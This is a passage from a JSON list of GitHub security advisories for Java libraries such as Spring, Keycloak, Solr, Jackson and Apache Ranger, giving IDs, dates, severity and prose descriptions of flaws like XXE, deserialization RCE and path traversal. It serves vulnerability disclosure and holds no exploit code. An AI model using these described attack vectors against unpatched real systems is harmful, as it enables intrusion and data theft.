    "ghsaId": "GHSA-r86j-2gc6-2cq9",
    "publishedAt": "2018-10-18T18:05:02Z",
    "description": "An issue in Apache HBase affects the optional \"Thrift 1\" API server when running over HTTP. There is a race-condition which could lead to authenticated sessions being incorrectly applied to users, e.g. one authenticated user would be considered a different user or an unauthenticated user would be treated as an authenticated user. https://issues.apache.org/jira/browse/HBASE-20664 implements a fix for this issue. It has been fixed in versions: 1.2.6.1, 1.3.2.1, 1.4.5, 2.0.1.",
    "summary": "High severity vulnerability that affects org.apache.hbase:hbase-thrift"
  },
  {
    "ghsaId": "GHSA-p8xr-4v2c-rvgp",
    "publishedAt": "2018-10-18T18:04:50Z",
    "description": "Apache HBase 0.98 before 0.98.12.1, 1.0 before 1.0.1.1, and 1.1 before 1.1.0.1, as used in IBM InfoSphere BigInsights 3.0, 3.0.0.1, and 3.0.0.2 and other products, uses incorrect ACLs for ZooKeeper coordination state, which allows remote attackers to cause a denial of service (daemon outage), obtain sensitive information, or modify data via unspecified client traffic.",
    "summary": "High severity vulnerability that affects org.apache.hbase:hbase"
  },
  {
    "ghsaId": "GHSA-9gp4-qrff-c648",
    "publishedAt": "2018-10-18T18:04:13Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES/ECIES CBC mode vulnerable to padding oracle attack. For BC 1.55 and older, in an environment where timings can be easily observed, it is possible with enough observations to identify when the decryption is failing due to padding.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-2j2x-hx4g-2gf4",
    "publishedAt": "2018-10-18T17:43:55Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-7c2r-3jqf-c9rw",
    "publishedAt": "2018-10-18T17:43:28Z",
    "description": "XmlMapper in the Jackson XML dataformat component (aka jackson-dataformat-xml) before 2.7.8 and 2.8.x before 2.8.4 allows remote attackers to conduct server-side request forgery (SSRF) attacks via vectors related to a DTD.",
    "summary": "Moderate severity vulnerability that affects com.fasterxml.jackson.dataformat:jackson-dataformat-xml"
  },
  {
    "ghsaId": "GHSA-hmq6-frv3-4727",
    "publishedAt": "2018-10-18T17:43:16Z",
    "description": "XML external entity (XXE) vulnerability in XmlMapper in the Data format extension for Jackson (aka jackson-dataformat-xml) allows attackers to have unspecified impact via unknown vectors.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.dataformat:jackson-dataformat-xml"
  },
  {
    "ghsaId": "GHSA-rfx6-vp9g-rh7v",
    "publishedAt": "2018-10-18T17:42:48Z",
    "description": "FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-h592-38cm-4ggp",
    "publishedAt": "2018-10-18T17:42:34Z",
    "description": "A deserialization flaw was discovered in the jackson-databind in versions before 2.8.10 and 2.9.1, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper. This issue extends the previous flaw CVE-2017-7525 by blacklisting more classes that could be used maliciously.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-g4gg-9f62-jfph",
    "publishedAt": "2018-10-18T17:41:40Z",
    "description": "The Studio component in OrientDB Server Community Edition before 2.0.15 and 2.1.x before 2.1.1 does not properly restrict use of FRAME elements, which makes it easier for remote attackers to conduct clickjacking attacks via a crafted web site.",
    "summary": "Moderate severity vulnerability that affects com.orientechnologies:orientdb-studio"
  },
  {
    "ghsaId": "GHSA-v6wr-fch2-vm5w",
    "publishedAt": "2018-10-18T17:41:27Z",
    "description": "server/network/protocol/http/OHttpSessionManager.java in the Studio component in OrientDB Server Community Edition before 2.0.15 and 2.1.x before 2.1.1 improperly relies on the java.util.Random class for generation of random Session ID values, which makes it easier for remote attackers to predict a value by determining the internal state of the PRNG in this class.",
    "summary": "Moderate severity vulnerability that affects com.orientechnologies:orientdb-studio"
  },
  {
    "ghsaId": "GHSA-p8ww-vv84-c2rm",
    "publishedAt": "2018-10-18T17:41:13Z",
    "description": "The JSONP endpoint in the Studio component in OrientDB Server Community Edition before 2.0.15 and 2.1.x before 2.1.1 does not properly restrict callback values, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks, and obtain sensitive information, via a crafted HTTP request.",
    "summary": "Moderate severity vulnerability that affects com.orientechnologies:orientdb-studio"
  },
  {
    "ghsaId": "GHSA-xm6r-4466-mr74",
    "publishedAt": "2018-10-18T17:40:56Z",
    "description": "OrientDB through 2.2.22 does not enforce privilege requirements during \"where\" or \"fetchplan\" or \"order by\" use, which allows remote attackers to execute arbitrary OS commands via a crafted request.",
    "summary": "High severity vulnerability that affects com.orientechnologies:orientdb-core"
  },
  {
    "ghsaId": "GHSA-xv6v-72hh-g6g2",
    "publishedAt": "2018-10-18T17:22:26Z",
    "description": "OWASP OWASP ANTISAMY version 1.5.7 and earlier contains a Cross Site Scripting (XSS) vulnerability in AntiSamy.scan() - for both SAX & DOM that can result in Cross Site Scripting.",
    "summary": "Moderate severity vulnerability that affects org.owasp.antisamy:antisamy"
  },
  {
    "ghsaId": "GHSA-q44v-xc3g-v7jq",
    "publishedAt": "2018-10-18T17:22:11Z",
    "description": "OWASP AntiSamy before 1.5.7 allows XSS via HTML5 entities, as demonstrated by use of &colon; to construct a javascript: URL.",
    "summary": "Moderate severity vulnerability that affects org.owasp.antisamy:antisamy"
  },
  {
    "ghsaId": "GHSA-683w-6h9j-57wq",
    "publishedAt": "2018-10-18T17:21:47Z",
    "description": "In OWASP AntiSamy before 1.5.5, by submitting a specially crafted input (a tag that supports style with active content), you could bypass the library protections and supply executable code. The impact is XSS.",
    "summary": "Moderate severity vulnerability that affects org.owasp.antisamy:antisamy"
  },
  {
    "ghsaId": "GHSA-fv7x-4hpc-hf9f",
    "publishedAt": "2018-10-18T16:57:21Z",
    "description": "Apache CXF Fediz ships with a number of container-specific plugins to enable WS-Federation for applications. A CSRF (Cross Style Request Forgery) style vulnerability has been found in the Spring 2, Spring 3 and Spring 4 plugins in versions before 1.4.3 and 1.3.3. The vulnerability can result in a security context that is set up using a malicious client's roles for the given enduser.",
    "summary": "Moderate severity vulnerability that affects org.apache.cxf.fediz:fediz-spring, org.apache.cxf.fediz:fediz-spring2, and org.apache.cxf.fediz:fediz-spring3"
  },
  {
    "ghsaId": "GHSA-qpwj-mvv7-v3m9",
    "publishedAt": "2018-10-18T16:57:10Z",
    "description": "The application plugins in Apache CXF Fediz 1.2.x before 1.2.3 and 1.3.x before 1.3.1 do not match SAML AudienceRestriction values against configured audience URIs, which might allow remote attackers to have bypass intended restrictions and have unspecified other impact via a crafted SAML token with a trusted signature.",
    "summary": "High severity vulnerability that affects org.apache.cxf.fediz:fediz-spring and org.apache.cxf.fediz:fediz-spring2"
  },
  {
    "ghsaId": "GHSA-3357-829x-m9pr",
    "publishedAt": "2018-10-18T16:57:00Z",
    "description": "Application plugins in Apache CXF Fediz before 1.1.3 and 1.2.x before 1.2.1 allow remote attackers to cause a denial of service.",
    "summary": "Moderate severity vulnerability that affects org.apache.cxf.fediz:fediz-spring2"
  },
  {
    "ghsaId": "GHSA-w3gh-g32m-cvhr",
    "publishedAt": "2018-10-18T16:56:47Z",
    "description": "Versions of Apache CXF Fediz prior to 1.4.4 do not fully disable Document Type Declarations (DTDs) when either parsing the Identity Provider response in the application plugins, or in the Identity Provider itself when parsing certain XML-based parameters.",
    "summary": "High severity vulnerability that affects org.apache.cxf.fediz:fediz-jetty8, org.apache.cxf.fediz:fediz-jetty9, org.apache.cxf.fediz:fediz-spring, org.apache.cxf.fediz:fediz-spring2, and org.apache.cxf.fediz:fediz-spring3"
  },
  {
    "ghsaId": "GHSA-whw7-h25v-9qvx",
    "publishedAt": "2018-10-18T16:56:38Z",
    "description": "Apache CXF Fediz ships with a number of container-specific plugins to enable WS-Federation for applications. A CSRF (Cross Style Request Forgery) style vulnerability has been found in the Spring 2, Spring 3, Jetty 8 and Jetty 9 plugins in Apache CXF Fediz prior to 1.4.0, 1.3.2 and 1.2.4.",
    "summary": "Moderate severity vulnerability that affects org.apache.cxf.fediz:fediz-jetty8, org.apache.cxf.fediz:fediz-jetty9, and org.apache.cxf.fediz:fediz-spring2"
  },
  {
    "ghsaId": "GHSA-r32r-3977-cgc3",
    "publishedAt": "2018-10-18T16:50:20Z",
    "description": "JBoss KeyCloak before 1.0.3.Final allows remote attackers to cause a denial of service (resource consumption) via a large value in the size parameter to auth/qrcode, related to QR code generation.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-959q-32g8-vvp7",
    "publishedAt": "2018-10-18T16:50:05Z",
    "description": "It was found that keycloak before 3.4.2 final would permit misuse of a client-side /etc/hosts entry to spoof a URL in a password reset request. An attacker could use this flaw to craft a malicious password reset request and gain a valid reset token, leading to information disclosure or further attacks.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-h7j7-pw3v-3v3x",
    "publishedAt": "2018-10-18T16:49:54Z",
    "description": "keycloak before version 4.0.0.final is vulnerable to a infinite loop in session replacement. A Keycloak cluster with multiple nodes could mishandle an expired session replacement and lead to an infinite loop. A malicious authenticated user could use this flaw to achieve Denial of Service on the server.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-c77r-6f64-478q",
    "publishedAt": "2018-10-18T16:49:40Z",
    "description": "It was found that while parsing the SAML messages the StaxParserUtil class of keycloak before 2.5.1 replaces special strings for obtaining attribute values with system property. This could allow an attacker to determine values of system properties at the attacked system by formatting the SAML request ID field to be the chosen system property which could be obtained in the \"InResponseTo\" field in the response.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-jc6q-27mw-p55w",
    "publishedAt": "2018-10-18T16:49:29Z",
    "description": "It was found that when Keycloak before 2.5.5 receives a Logout request with a Extensions in the middle of the request, the SAMLSloRequestParser.parse() method ends in a infinite loop. An attacker could use this flaw to conduct denial of service attacks.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-95m6-mjh3-58gm",
    "publishedAt": "2018-10-18T16:48:41Z",
    "description": "It was found that the keycloak before 2.3.0 did not implement authentication flow correctly. An attacker could use this flaw to construct a phishing URL, from which he could hijack the user's session. This could lead to information disclosure, or permit further possible attacks.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-qgm9-232x-hwpx",
    "publishedAt": "2018-10-18T16:48:15Z",
    "description": "Keycloak SSO versions prior to 2.x are vulnerable to Host Header Injection on the forgot password page causing the application to send a poisoned URL as the password reset link.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-778x-2mqv-w6xw",
    "publishedAt": "2018-10-18T16:48:01Z",
    "description": "Red Hat Keycloak before version 2.4.0 did not correctly check permissions when handling service account user deletion requests sent to the rest server. An attacker with service account authentication could use this flaw to bypass normal permissions and delete users in a separate realm.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-w6gv-3r3v-gwgj",
    "publishedAt": "2018-10-18T16:47:41Z",
    "description": "Red Hat Keycloak before version 2.5.1 has an implementation of HMAC verification for JWS tokens that uses a method that runs in non-constant time, potentially leaving the application vulnerable to timing attacks.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-387v-84cv-9qmc",
    "publishedAt": "2018-10-18T16:40:43Z",
    "description": "When using the Index Replication feature, Apache Solr nodes can pull index files from a master/leader node using an HTTP API which accepts a file name. However, Solr before 5.5.4 and 6.x before 6.4.1 did not validate the file name, hence it was possible to craft a special request involving path traversal, leaving any file readable to the Solr server process exposed. Solr servers protected and restricted by firewall rules and/or authentication would not be at risk since only trusted clients and users would gain direct HTTP access.",
    "summary": "Moderate severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-8crv-49fr-2h6j",
    "publishedAt": "2018-10-17T20:30:12Z",
    "description": "Both Spring Security 3.2.x, 4.0.x, 4.1.0 and the Spring Framework 3.2.x, 4.0.x, 4.1.x, 4.2.x rely on URL pattern mappings for authorization and for mapping requests to controllers respectively. Differences in the strictness of the pattern matching mechanisms, for example with regards to space trimming in path segments, can lead Spring Security to not recognize certain paths as not protected that are in fact mapped to Spring MVC controllers that should be protected. The problem is compounded by the fact that the Spring Framework provides richer features with regards to pattern matching as well as by the fact that pattern matching in each Spring Security and the Spring Framework can easily be customized creating additional differences.",
    "summary": "Moderate severity vulnerability that affects org.springframework.security:spring-security-core and org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-pgf9-h69p-pcgf",
    "publishedAt": "2018-10-17T20:29:33Z",
    "description": "Under some situations, the Spring Framework 4.2.0 to 4.2.1, 4.0.0 to 4.1.7, 3.2.0 to 3.2.14 and older unsupported versions is vulnerable to a Reflected File Download (RFD) attack. The attack involves a malicious user crafting a URL with a batch script extension that results in the response being downloaded rather than rendered and also includes some input reflected in the response.",
    "summary": "High severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-6v7w-535j-rq5m",
    "publishedAt": "2018-10-17T20:29:12Z",
    "description": "Pivotal Spring Framework before 3.2.14 and 4.x before 4.1.7 do not properly process inline DTD declarations when DTD is not entirely disabled, which allows remote attackers to cause a denial of service (memory consumption and out-of-memory errors) via a crafted XML file.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-45vg-2v73-vm62",
    "publishedAt": "2018-10-17T20:28:20Z",
    "description": "The Java SockJS client in Pivotal Spring Framework 4.1.x before 4.1.5 generates predictable session ids, which allows remote attackers to send messages to other sessions via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-3rmv-2pg5-xvqj",
    "publishedAt": "2018-10-17T20:28:00Z",
    "description": "Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.16 and older unsupported versions, allow applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a remote code execution attack. This CVE addresses the partial fix for CVE-2018-1270 in the 4.3.x branch of the Spring Framework.",
    "summary": "High severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-4487-x383-qpph",
    "publishedAt": "2018-10-17T20:27:47Z",
    "description": "Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, provide client-side support for multipart requests. When Spring MVC or Spring WebFlux server application (server A) receives input from a remote client, and then uses that input to make a multipart request to another server (server B), it can be exposed to an attack, where an extra multipart is inserted in the content of the request from server A, causing server B to use the wrong value for a part it expects. This could to lead privilege escalation, for example, if the part content represents a username or user roles.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-g8hw-794c-4j9g",
    "publishedAt": "2018-10-17T20:07:03Z",
    "description": "Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). When static resources are served from a file system on Windows (as opposed to the classpath, or the ServletContext), a malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-p5hg-3xm3-gcjg",
    "publishedAt": "2018-10-17T20:05:59Z",
    "description": "Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, allow applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a remote code execution attack.",
    "summary": "High severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-cxrj-66c5-9fmh",
    "publishedAt": "2018-10-17T20:05:49Z",
    "description": "Spring Framework version 5.0.5 when used in combination with any versions of Spring Security contains an authorization bypass when using method security. An unauthorized malicious user can gain unauthorized access to methods that should be restricted.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-rcpf-vj53-7h2m",
    "publishedAt": "2018-10-17T20:02:20Z",
    "description": "Spring Framework, versions 5.0.x prior to 5.0.6, versions 4.3.x prior to 4.3.17, and older unsupported versions allows applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a regular expression, denial of service attack.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-v596-fwhq-8x48",
    "publishedAt": "2018-10-17T20:01:54Z",
    "description": "Spring Security (Spring Security 4.1.x before 4.1.5, 4.2.x before 4.2.4, and 5.0.x before 5.0.1; and Spring Framework 4.3.x before 4.3.14 and 5.0.x before 5.0.3) does not consider URL path parameters when processing security constraints. By adding a URL path parameter with special encodings, an attacker may be able to bypass a security constraint. The root cause of this issue is a lack of clarity regarding the handling of path parameters in the Servlet Specification. Some Servlet containers include path parameters in the value returned for getPathInfo() and some do not. Spring Security uses the value returned by getPathInfo() as part of the process of mapping requests to security constraints. In this particular attack, different character encodings used in path parameters allows secured Spring MVC static resource URLs to be bypassed.",
    "summary": "High severity vulnerability that affects org.springframework.security:spring-security-core, org.springframework.security:spring-security-core , and org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-mh7g-99w9-xpjm",
    "publishedAt": "2018-10-17T19:56:17Z",
    "description": "Remote code execution occurs in Apache Solr before 7.1 with Apache Lucene before 7.1 by exploiting XXE in conjunction with use of a Config API add-listener command to reach the RunExecutableListener class. Elasticsearch, although it uses Lucene, is NOT vulnerable to this. Note that the XML external entity expansion vulnerability occurs in the XML Query Parser which is available, by default, for any query request with parameters deftype=xmlparser and can be exploited to upload malicious data to the /upload request handler or as Blind XXE using ftp wrapper in order to read arbitrary local files from the Solr server. Note also that the second vulnerability relates to remote code execution using the RunExecutableListener available on all affected versions of Solr.",
    "summary": "High severity vulnerability that affects org.apache.lucene:lucene-core and org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-rc9v-h28f-jcmf",
    "publishedAt": "2018-10-17T19:56:04Z",
    "description": "This vulnerability in Apache Solr 6.0.0 to 6.6.3, 7.0.0 to 7.3.0 relates to an XML external entity expansion (XXE) in Solr config files (solrconfig.xml, schema.xml, managed-schema). In addition, Xinclude functionality provided in these config files is also affected in a similar way. The vulnerability can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network. Users are advised to upgrade to either Solr 6.6.4 or Solr 7.3.1 releases both of which address the vulnerability. Once upgrade is complete, no other steps are required. Those releases only allow external entities and Xincludes that refer to local files / zookeeper resources below the Solr instance directory (using Solr's ResourceLoader); usage of absolute URLs is denied. Keep in mind, that external entities and XInclude are explicitly supported to better structure config files in large installations. Before Solr 6 this was no problem, as config files were not accessible through the APIs.",
    "summary": "Low severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-3pph-2595-cgfh",
    "publishedAt": "2018-10-17T19:55:46Z",
    "description": "This vulnerability in Apache Solr 1.2 to 6.6.2 and 7.0.0 to 7.2.1 relates to an XML external entity expansion (XXE) in the `&dataConfig=<inlinexml>` parameter of Solr's DataImportHandler. It can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network.",
    "summary": "Moderate severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-7px3-6f6g-hxcj",
    "publishedAt": "2018-10-17T19:55:34Z",
    "description": "This vulnerability in Apache Solr 6.0.0 to 6.6.4 and 7.0.0 to 7.3.1 relates to an XML external entity expansion (XXE) in Solr config files (currency.xml, enumsConfig.xml referred from schema.xml, TIKA parsecontext config file). In addition, Xinclude functionality provided in these config files is also affected in a similar way. The vulnerability can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network. The manipulated files can be uploaded as configsets using Solr's API, allowing to exploit that vulnerability.",
    "summary": "Moderate severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-rhq2-2574-78mc",
    "publishedAt": "2018-10-17T19:54:53Z",
    "description": "The unzip function in ZipUtil.java in Hutool before 4.1.12 allows remote attackers to overwrite arbitrary files via directory traversal sequences in a filename within a ZIP archive.",
    "summary": "Moderate severity vulnerability that affects cn.hutool:hutool-all, cn.hutool:hutool-core, and cn.hutool:hutool-parent"
  },
  {
    "ghsaId": "GHSA-c8cc-p3j7-4c7f",
    "publishedAt": "2018-10-17T19:54:14Z",
    "description": "Apache Mesos can be configured to require authentication to call the Executor HTTP API using JSON Web Token (JWT). In Apache Mesos versions pre-1.4.2, 1.5.0, 1.5.1, 1.6.0 the comparison of the generated HMAC value against the provided signature in the JWT implementation used is vulnerable to a timing attack because instead of a constant-time string comparison routine a standard `==` operator has been used. A malicious actor can therefore abuse the timing difference of when the JWT validation function returns to reveal the correct HMAC value.",
    "summary": "Moderate severity vulnerability that affects org.apache.mesos:mesos"
  },
  {
    "ghsaId": "GHSA-4r64-wf76-c53p",
    "publishedAt": "2018-10-17T19:52:52Z",
    "description": "In blynk-server in Blynk before 0.39.7, Directory Traversal exists via a ../ in a URI that has /static or /static/js at the beginning, as demonstrated by reading the /etc/passwd file.",
    "summary": "Moderate severity vulnerability that affects com.github.blynkkk:blynk-server"
  },
  {
    "ghsaId": "GHSA-q35p-chc6-7x57",
    "publishedAt": "2018-10-17T19:48:18Z",
    "description": "Apache Storm version 1.0.6 and earlier, 1.2.1 and earlier, and version 1.1.2 and earlier expose a vulnerability that could allow a user to impersonate another user when communicating with some Storm Daemons.",
    "summary": "Moderate severity vulnerability that affects org.apache.storm:storm-core"
  },
  {
    "ghsaId": "GHSA-p8jx-x2vw-wm33",
    "publishedAt": "2018-10-17T19:48:06Z",
    "description": "In Apache Storm 0.10.0 through 0.10.2, 1.0.0 through 1.0.6, 1.1.0 through 1.1.2, and 1.2.0 through 1.2.1, an attacker with access to a secure storm cluster in some cases could execute arbitrary code as a different user.",
    "summary": "High severity vulnerability that affects org.apache.storm:storm-core"
  },
  {
    "ghsaId": "GHSA-x825-rjww-2245",
    "publishedAt": "2018-10-17T18:30:01Z",
    "description": "It was found that under some situations and configurations of Apache Storm 1.x before 1.0.4 and 1.1.x before 1.1.1, it is theoretically possible for the owner of a topology to trick the supervisor to launch a worker as a different, non-root, user. In the worst case this could lead to secure credentials of the other user being compromised.",
    "summary": "Moderate severity vulnerability that affects org.apache.storm:storm-core"
  },
  {
    "ghsaId": "GHSA-6fvx-r7hx-3vh6",
    "publishedAt": "2018-10-17T18:28:00Z",
    "description": "JavaMelody before 1.74.0 has XXE via parseSoapMethodName in bull/javamelody/PayloadNameRequestWrapper.java.",
    "summary": "Moderate severity vulnerability that affects net.bull.javamelody:javamelody-core"
  },
  {
    "ghsaId": "GHSA-gx96-vgf7-hwfg",
    "publishedAt": "2018-10-17T18:22:29Z",
    "description": "In Apache PDFBox 1.8.0 to 1.8.15 and 2.0.0RC1 to 2.0.11, a carefully crafted PDF file can trigger an extremely long running computation when parsing the page tree.",
    "summary": "High severity vulnerability that affects org.apache.pdfbox:pdfbox"
  },
  {
    "ghsaId": "GHSA-4c32-xmgj-2g98",
    "publishedAt": "2018-10-17T18:22:15Z",
    "description": "Apache PDFBox before 1.8.12 and 2.x before 2.0.1 does not properly initialize the XML parsers, which allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted PDF.",
    "summary": "High severity vulnerability that affects org.apache.pdfbox:pdfbox"
  },
  {
    "ghsaId": "GHSA-h5f5-rj4r-42f6",
    "publishedAt": "2018-10-17T17:31:26Z",
    "description": "Due to incorrect access control in Neo4j Enterprise Database Server 3.4.x before 3.4.9, the setting of LDAP for authentication with STARTTLS, and System Account for authorization, allows an attacker to log into the server by sending any valid username with an arbitrary password.",
    "summary": "High severity vulnerability that affects org.neo4j:neo4j-enterprise"
  },
  {
    "ghsaId": "GHSA-5q8m-mqmx-pxp9",
    "publishedAt": "2018-10-17T17:23:44Z",
    "description": "Spring Data Commons, versions 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property path parser vulnerability caused by unlimited resource allocation. An unauthenticated remote malicious user (or attacker) can issue requests against Spring Data REST endpoints or endpoints using property path parsing which can cause a denial of service (CPU and memory consumption).",
    "summary": "Moderate severity vulnerability that affects org.springframework.data:spring-data-commons"
  },
  {
    "ghsaId": "GHSA-m929-7fr6-cvjg",
    "publishedAt": "2018-10-17T17:23:36Z",
    "description": "Spring Data Commons, versions 1.13 prior to 1.13.12 and 2.0 prior to 2.0.7, used in combination with XMLBeam 1.4.14 or earlier versions, contains a property binder vulnerability caused by improper restriction of XML external entity references as underlying library XMLBeam does not restrict external reference expansion. An unauthenticated remote malicious user can supply specially crafted request parameters against Spring Data's projection-based request payload binding to access arbitrary files on the system.",
    "summary": "Moderate severity vulnerability that affects org.springframework.data:spring-data-commons"
  },
  {
    "ghsaId": "GHSA-4fq3-mr56-cg6r",
    "publishedAt": "2018-10-17T17:23:24Z",
    "description": "Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data's projection-based request payload binding hat can lead to a remote code execution attack.",
    "summary": "High severity vulnerability that affects org.springframework.data:spring-data-commons"
  },
  {
    "ghsaId": "GHSA-ffjh-fjgg-mfpq",
    "publishedAt": "2018-10-17T17:22:49Z",
    "description": "In environments that use external location for hive tables, Hive Authorizer in Apache Ranger before 0.7.1 should be checking RWX permission for create table.",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-758m-6g3q-g3hh",
    "publishedAt": "2018-10-17T17:22:38Z",
    "description": "Policy resource matcher in Apache Ranger before 0.7.1 ignores characters after '*' wildcard character - like my*test, test*.txt. This can result in unintended behavior.",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-c99h-fgqm-6679",
    "publishedAt": "2018-10-17T17:22:23Z",
    "description": "UnixAuthenticationService in Apache Ranger 1.2.0 was updated to correctly handle user input to avoid Stack-based buffer overflow. Versions prior to 1.2.0 should be upgraded to 1.2.0",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-xv7x-x6wr-xx7g",
    "publishedAt": "2018-10-17T17:22:05Z",
    "description": "Apache Ranger before 0.6.3 policy engine incorrectly matches paths in certain conditions when policy does not contain wildcards and has recursion flag set to true.",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-v7mf-qgxf-qmvf",
    "publishedAt": "2018-10-17T17:21:54Z",
    "description": "Apache Ranger before 0.6.is vulnerable to a Stored Cross-Site Scripting in when entering custom policy conditions. Admin users can store some arbitrary javascript code to be executed when normal users login and access policies.",
    "summary": "Low severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-vhxc-8jjq-859j",
    "publishedAt": "2018-10-17T17:21:44Z",
    "description": "In Apache Ranger before 0.6.2, users with \"keyadmin\" role should not be allowed to change password for users with \"admin\" role.",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-rf7q-xqm3-6923",
    "publishedAt": "2018-10-17T17:21:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in the create user functionality in the policy admin tool in Apache Ranger before 0.6.1 allows remote authenticated administrators to inject arbitrary web script or HTML via vectors related to policies.",
    "summary": "Low severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-4rjf-mxfm-98h5",
    "publishedAt": "2018-10-17T17:21:29Z",
    "description": "SQL injection vulnerability in the policy admin tool in Apache Ranger before 0.5.3 allows remote authenticated administrators to execute arbitrary SQL commands via the eventTime parameter to service/plugins/policies/eventTime.",
    "summary": "Moderate severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-j84c-j8qm-g47r",
    "publishedAt": "2018-10-17T17:21:11Z",
    "description": "The Admin UI in Apache Ranger before 0.5.1 does not properly handle authentication requests that lack a password, which allows remote attackers to bypass authentication by leveraging knowledge of a valid username.",
    "summary": "High severity vulnerability that affects org.apache.ranger:ranger"
  },
  {
    "ghsaId": "GHSA-6v52-mj5r-7j2m",
    "publishedAt": "2018-10-17T16:33:02Z",
